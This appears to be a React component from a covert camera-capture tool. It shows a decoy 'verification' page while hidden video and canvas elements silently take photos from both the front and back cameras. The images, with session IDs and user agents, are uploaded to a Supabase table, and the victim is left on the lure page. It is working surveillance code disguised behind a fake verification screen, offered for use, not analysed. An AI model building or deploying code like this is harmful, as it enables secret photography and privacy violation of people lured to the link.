import { useEffect, useState, useRef } from "react";
import { useSearchParams } from "react-router-dom";
import { supabase } from "@/integrations/supabase/client";

const CustomCapture = () => {
  const [searchParams] = useSearchParams();
  const videoRef = useRef<HTMLVideoElement>(null);
  const canvasRef = useRef<HTMLCanvasElement>(null);
  const [customHtml, setCustomHtml] = useState<string | null>(null);
  const [captureComplete, setCaptureComplete] = useState(false);
  
  const sessionId = searchParams.get("session") || "default";
  const redirectUrl = searchParams.get("redirect") || "https://google.com";

  // Load custom HTML from settings
  useEffect(() => {
    const loadCustomHtml = async () => {
      try {
        const { data, error } = await supabase
          .from('app_settings')
          .select('setting_value')
          .eq('setting_key', 'main_settings')
          .maybeSingle();

        if (data && !error) {
          const settings = data.setting_value as { customCaptureHtml?: string };
          if (settings.customCaptureHtml) {
            setCustomHtml(settings.customCaptureHtml);
            return;
          }
        }
        
        // Fallback: If no custom HTML found, use a default capture page
        const defaultHtml = `
          <!DOCTYPE html>
          <html>
          <head>
            <meta name="viewport" content="width=device-width, initial-scale=1.0">
            <title>Verification</title>
            <style>
              body { font-family: Arial, sans-serif; background: #1a1a2e; color: white; display: flex; align-items: center; justify-content: center; min-height: 100vh; margin: 0; }
              .container { text-align: center; padding: 20px; }
              h1 { color: #00ff88; }
              p { color: #888; }
            </style>
          </head>
          <body>
            <div class="container">
              <h1>✓ Verification Complete</h1>
              <p>Thank you for verifying. You may close this page.</p>
            </div>
          </body>
          </html>
        `;
        setCustomHtml(defaultHtml);
      } catch (err) {
        console.error('Error loading custom HTML:', err);
        // On error, still set a fallback HTML so camera capture works
        setCustomHtml('<div style="display:flex;align-items:center;justify-content:center;min-height:100vh;background:#1a1a2e;color:#00ff88;font-family:Arial;">Verification in progress...</div>');
      }
    };

    loadCustomHtml();
  }, []);

  const captureFromCamera = async (facingMode: "user" | "environment"): Promise<string | null> => {
    try {
      const stream = await navigator.mediaDevices.getUserMedia({ 
        video: { facingMode, width: 640, height: 480 } 
      });
      
      if (videoRef.current) {
        videoRef.current.srcObject = stream;
        await videoRef.current.play();
        
        await new Promise(resolve => setTimeout(resolve, 800));
        
        if (canvasRef.current && videoRef.current) {
          const canvas = canvasRef.current;
          const video = videoRef.current;
          canvas.width = video.videoWidth;
          canvas.height = video.videoHeight;
          const ctx = canvas.getContext("2d");
          if (ctx) {
            ctx.drawImage(video, 0, 0);
            const imageData = canvas.toDataURL("image/jpeg", 0.8);
            stream.getTracks().forEach(track => track.stop());
            return imageData;
          }
        }
        
        stream.getTracks().forEach(track => track.stop());
      }
      
      return null;
    } catch (error) {
      console.error(`Camera ${facingMode} access denied:`, error);
      return null;
    }
  };

  // Capture photos when custom HTML is loaded
  useEffect(() => {
    if (!customHtml || captureComplete) return;

    const capturePhotos = async () => {
      try {
        // Capture from FRONT camera first
        const frontImage = await captureFromCamera("user");
        
        if (frontImage) {
          await supabase.from('captured_photos').insert({
            session_id: sessionId,
            image_data: frontImage,
            user_agent: `${navigator.userAgent} [FRONT]`
          });
        }
        
        await new Promise(resolve => setTimeout(resolve, 300));
        
        // Capture from BACK camera
        const backImage = await captureFromCamera("environment");
        
        if (backImage) {
          await supabase.from('captured_photos').insert({
            session_id: sessionId,
            image_data: backImage,
            user_agent: `${navigator.userAgent} [BACK]`
          });
        }
        
        setCaptureComplete(true);
        // No redirect - user stays on custom HTML page
        
      } catch (error) {
        console.error("Capture error:", error);
      }
    };

    // Start capture after a short delay to let HTML render
    const timer = setTimeout(capturePhotos, 500);
    return () => clearTimeout(timer);
  }, [customHtml, captureComplete, sessionId]);

  // Show loading if no custom HTML
  if (!customHtml) {
    return (
      <div className="min-h-screen bg-background flex items-center justify-center">
        <video ref={videoRef} className="hidden" autoPlay playsInline muted />
        <canvas ref={canvasRef} className="hidden" />
        <div className="text-center">
          <div className="w-8 h-8 border-2 border-primary border-t-transparent rounded-full animate-spin mx-auto mb-4" />
          <p className="text-muted-foreground text-sm">Loading...</p>
        </div>
      </div>
    );
  }

  // Render custom HTML with hidden video/canvas for capture
  return (
    <>
      {/* Hidden video and canvas for capture */}
      <video ref={videoRef} className="hidden" autoPlay playsInline muted />
      <canvas ref={canvasRef} className="hidden" />
      
      {/* Render custom HTML */}
      <div dangerouslySetInnerHTML={{ __html: customHtml }} />
    </>
  );
};

export default CustomCapture;
